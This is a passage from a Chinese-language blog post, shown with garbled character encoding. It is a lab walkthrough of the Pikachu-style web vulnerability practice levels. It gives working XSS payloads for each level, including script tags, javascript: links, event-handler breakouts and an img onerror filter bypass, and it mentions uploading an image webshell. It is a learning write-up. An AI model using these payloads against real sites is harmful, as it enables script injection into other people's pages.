class=&#x27;notice&#x27;&gt;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;æ–‡ä»¶ä¿å­˜çš„è·¯å¾„ä¸ºï¼š<span class="hljs-subst">&#123;$upload[&#x27;save_path&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p class=notice&gt;<span class="hljs-subst">&#123;$upload[&#x27;error&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯ä¸Šä¼ ä¹‹åæ–°å»ºå‡ ä¸ªæ–‡ä»¶å¤¹å­˜æ”¾ç…§ç‰‡å˜›ã€‚ã€‚ã€‚</p>
<p>ç›´æ¥ä¸Šä¼ åˆšæ‰çš„å›¾ç‰‡é©¬ç„¶åbpæ”¹åç¼€ç„¶åF12çœ‹å“åº”å°±å¯ä»¥çŸ¥é“è·¯å¾„äº†</p>
<h1 id="XSSè·¨ç«™æ”»å‡»"><a href="#XSSè·¨ç«™æ”»å‡»" class="headerlink" title="XSSè·¨ç«™æ”»å‡»"></a>XSSè·¨ç«™æ”»å‡»</h1><h2 id="åå°„æ€§xssï¼ˆgetï¼‰"><a href="#åå°„æ€§xssï¼ˆgetï¼‰" class="headerlink" title="åå°„æ€§xssï¼ˆgetï¼‰"></a>åå°„æ€§xssï¼ˆgetï¼‰</h2><p>ä¸çœ‹é¢˜ç›´æ¥æ„é€ payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šå…³ï¼ˆæ³¨æ„å‰ç«¯ä¿®æ”¹è¾“å…¥é•¿åº¦ï¼‰</p>
<h2 id="åå°„æ€§xssï¼ˆpostï¼‰"><a href="#åå°„æ€§xssï¼ˆpostï¼‰" class="headerlink" title="åå°„æ€§xssï¼ˆpostï¼‰"></a>åå°„æ€§xssï¼ˆpostï¼‰</h2><p>è¿™ä¸€å…³å·²ç»å°†ç™»é™†å¯†ç æ”¾åœ¨äº†æç¤ºé‡Œé¢ï¼Œæˆ‘ä»¬è¦æ³¨å…¥çš„ä¸æ˜¯è¿™ä¸ªç™»å½•é¡µé¢ï¼Œè€Œæ˜¯ç™»é™†åçš„ä¸œè¥¿</p>
<p>æˆ‘ä»¬ç›´æ¥åœ¨ç™»å½•æ¡†è¾“å…¥payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å°±é€šå…³äº†ï¼Œä»–å’Œä¸Šé¢å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯æ²¡æœ‰å‰ç«¯é•¿åº¦é™åˆ¶ï¼Œä¸ç”¨è‡ªå·±ä¿®æ”¹äº†ã€‚ã€‚ã€‚ã€‚</p>
<h2 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><p>ï¼ˆä¸Šé¢ä¸€é¢˜æ˜¯å­˜å‚¨å‹ï¼Œåœ¨ã€Šå­˜å‚¨å‹,Domå‹Xssæ³¨å…¥å­¦ä¹ ç¬”è®°ã€‹è¿™ç¯‡æ–‡ä¸­å·²ç»åŠè·¯è¿‡äº†å› æ­¤è·³è¿‡ï¼‰</p>
<hr>
<p>ä¸€å¼€å§‹çœ‹ä¸æ‡‚é¢˜å•¥æ„æ€ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹é¡µé¢æºç ï¼š</p>


<p>å°±æ˜¯a hrefæ³¨å…¥å•Šï¼Œé‚£ç›´æ¥æ„é€ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javascript:alert()<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šå…³</p>
<h2 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h2><p>è¿™ä¸€å…³æœ‰ç‚¹æ„æ€ï¼Œè®©ä½ è¾“å…¥ä¸€ä¸ªä¸œè¥¿ï¼Œç„¶åå‡ºç°ä¸€ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å¼€è¶…é“¾æ¥è¿˜æœ‰ä¸€ä¸ªè¶…é“¾æ¥ï¼Œé‚£ä¸ªè¶…é“¾æ¥æŒ‡å‘çš„æœ€åä¸€çº§è·¯å¾„å°±æ˜¯ä½ è¾“å…¥çš„é‚£ä¸ªä¸œè¥¿ã€‚ã€‚ã€‚ã€‚æ²¡ææ‡‚è¿™æ€ä¹ˆåˆ©ç”¨</p>
<p>ä½†æ˜¯f12ä»”ç»†åˆçœ‹äº†ä¸€ä¸‹è¿˜æ˜¯å‘ç°äº†æ³¨å…¥ç‚¹</p>


<p>æ„é€ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>

<h2 id="XSSç›²æ‰“"><a href="#XSSç›²æ‰“" class="headerlink" title="XSSç›²æ‰“"></a>XSSç›²æ‰“</h2><p>é¦–å…ˆåœ¨ç•™è¨€æ¡†è¾“å…¥payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å‘ç°æ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æç¤ºè®©æˆ‘ä»¬ç™»å½•åå°ï¼Œå¹¶ä¸”ç»™äº†å¯†ç ï¼Œç™»å½•è¿›å»å‘ç°å‡ºç°äº†å¼¹çª—ï¼Œé€šå…³</p>
<p>å…¶å®è¿™ä¸€å…³çš„åŸç†å°±æ˜¯å­˜å‚¨å‹xssï¼Œè¾“å…¥çš„æ—¶å€™ä¸ä¼šæœ‰ååº”ï¼Œä½†æ˜¯åœ¨åå°ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆäº†xssæ³¨å…¥</p>
<p>å› æ­¤å­˜å‚¨å‹xssçš„ä¸»è¦åœºæ™¯å°±æ˜¯é‚£ç§åœ¨çº¿ç¼–è¾‘å™¨å’Œè¯„è®ºç³»ç»Ÿä¸€ç±»çš„</p>
<h2 id="XSSè¿‡æ»¤"><a href="#XSSè¿‡æ»¤" class="headerlink" title="XSSè¿‡æ»¤"></a>XSSè¿‡æ»¤</h2><p>è¿™ä¸€å…³ç»ˆäºè¿‡æ»¤äº†ï¼Œè¾“å‡ºæˆ‘ä»¬çš„payloadä¹‹ååªå‰©ä¸‹äº†ä¸€ä¸ªå°–æ‹¬å·ï¼Œå°è¯•æ¢ä¸€ä¸ªè¯­å¥ï¼Œå‰é¢dvwaç”¨çš„æ˜¯img srcè¿™é‡Œå°±ç”¨a hrefè¯­å¥å§</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¯èƒ½æ˜¯åç«¯å§javascriptçš„scriptè¿‡æ»¤äº†ï¼Œåªèƒ½ä½¿ç”¨img srcäº†</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">114514</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šå…³</p>
<h2 id="XSS-Htmlspecialcharsè¿‡æ»¤"><a href="#XSS-Htmlspecialcharsè¿‡æ»¤" class="headerlink" title="XSS Htmlspecialcharsè¿‡æ»¤"></a>XSS Htmlspecialcharsè¿‡æ»¤</h2><p>è¿™ä¸ªç»•è¿‡æ–¹å¼å°±æ˜¯é€šè¿‡äº‹ä»¶æ¥ç»•è¿‡ï¼Œæˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ç‚¹ä¸œè¥¿æ¥çœ‹çœ‹é¡µé¢æºä»£ç </p>
<p>æ¬¸ç­‰ç­‰ã€‚ã€‚ã€‚è¿™ä¼¼ä¹æ˜¯hrefæ³¨å…¥å•Šï¼Ÿï¼Ÿ</p>


<p>çœ‹äº†ä¸€ä¸‹æºç </p>


<p>ç¡®å®æœ‰è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å°±æŒ‰ç…§ä»–çš„æ¥ï¼Œæ„é€ onfocusäº‹ä»¶æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; onfocus=javascript:alert() &#x27;<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸ</p>
<h2 id="XSS-hrefè¾“å‡º"><a href="#XSS-hrefè¾“å‡º" class="headerlink" title="XSS hrefè¾“å‡º"></a>XSS hrefè¾“å‡º</h2><p>å’Œä¸Šé¢ä¸€å…³çš„payloadå…¶å®å¯ä»¥ç”¨ä¸€æ ·çš„ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">javascript:alert()<br></code></pre></td></tr></table></figure>

<h2 id="XSS-jsè¾“å‡º"><a href="#XSS-jsè¾“å‡º" class="headerlink" title="XSS jsè¾“å‡º"></a>XSS jsè¾“å‡º</h2><p>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼š</p>


<p>è¿™é‡Œåªéœ€è¦é—­åˆä¸€ä¸‹å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>å¸¦å…¥åŸæ¥çš„æºä»£ç çœ‹ä¸€çœ‹ï¼š</p>


<p>åé¢çš„é‚£ä¸ª<code>&lt;/script&gt;</code>å‡ºç°äº†è¯­æ³•é”™è¯¯ï¼Œä½†æ˜¯è¿™æ— ä¼¤å¤§é›…ï¼Œå¹¶ä¸å½±å“è¿è¡Œï¼</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/19/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-18/">â† Next Sqlæ³¨å…¥å­¦ä¹ ç¬”è®°#18</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/17/%E5%A2%A8%E5%AE%A2%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/">å¢¨å®¢é¶åœºæ‰“é¶éšè®° Prev â†’</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="å›åˆ°é¡¶éƒ¨" style="opacity: 0; display: none;">âˆ§</a><a id="to-index" href="#toc-div" title="æ–‡ç« ç›®å½•">â‰¡</a><a id="color-mode" onClick="colorMode.change()" title="åˆ‡æ¢ä¸»é¢˜"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>ä¸ä¸æ— è°“äººäº‰æ°”</p></div></div><div id="aside-block"><div id="toc-div"><h1>ç›®å½•</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Sqlæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Post%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">ç¬¬ä¸€å…³ æ•°å­—å‹æ³¨å…¥ï¼ˆPostï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Get%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">ç¬¬äºŒå…³ å­—ç¬¦å‹æ³¨å…¥ï¼ˆGetï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">ç¬¬ä¸‰å…³ æœç´¢å‹æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3-xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">ç¬¬å››å…³ xxå‹æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3-insert%E3%80%81update%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">ç¬¬äº”å…³ insertã€updateæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3-delete%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">ç¬¬å…­å…³ deleteæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3-http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">ç¬¬ä¸ƒå…³ httpå¤´æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB-%E4%B9%9D%E5%85%B3-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.8.</span> <span class="toc-text">ç¬¬å…«,ä¹å…³ ç›²æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">ç¬¬åå…³ å®½å­—èŠ‚æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">æ–‡ä»¶åŒ…å«æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-Local-File-Include"><span class="toc-number">2.1.</span> <span class="toc-text">LFI(Local File Include)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RFI-Remote-File-Include"><span class="toc-number">2.2.</span> <span class="toc-text">RFI(Remote File Include)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">æ–‡ä»¶ä¸‹è½½æ¼æ´</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">æ–‡ä»¶ä¸Šä¼ æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-Check"><span class="toc-number">4.1.</span> <span class="toc-text">Client Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mime-Type"><span class="toc-number">4.2.</span> <span class="toc-text">Mime Type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-Image-Size"><span class="toc-number">4.3.</span> <span class="toc-text">Get Image Size</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">XSSè·¨ç«™æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss%EF%BC%88get%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">åå°„æ€§xssï¼ˆgetï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss%EF%BC%88post%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">åå°„æ€§xssï¼ˆpostï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">5.3.</span> <span class="toc-text">DOMå‹xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">5.4.</span> <span class="toc-text">DOMå‹xss-x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9B%B2%E6%89%93"><span class="toc-number">5.5.</span> <span class="toc-text">XSSç›²æ‰“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%BF%87%E6%BB%A4"><span class="toc-number">5.6.</span> <span class="toc-text">XSSè¿‡æ»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Htmlspecialchars%E8%BF%87%E6%BB%A4"><span class="toc-number">5.7.</span> <span class="toc-text">XSS Htmlspecialcharsè¿‡æ»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-href%E8%BE%93%E5%87%BA"><span class="toc-number">5.8.</span> <span class="toc-text">XSS hrefè¾“å‡º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-js%E8%BE%93%E5%87%BA"><span class="toc-number">5.9.</span> <span class="toc-text">XSS jsè¾“å‡º</span></a></li></ol></li></ol></div></div><footer><nobr>æ„å»ºè‡ª <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> ä½¿ç”¨ä¸»é¢˜ <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>ä¸»é¢˜ä½œè€… <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
 el: '#valine'
 , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
 , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'æ­¤æ¡è¯„è®ºå§”æ‰˜ä¼é¹…ç‰©æµå‘é€'
 , path: window.location.pathname
});code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>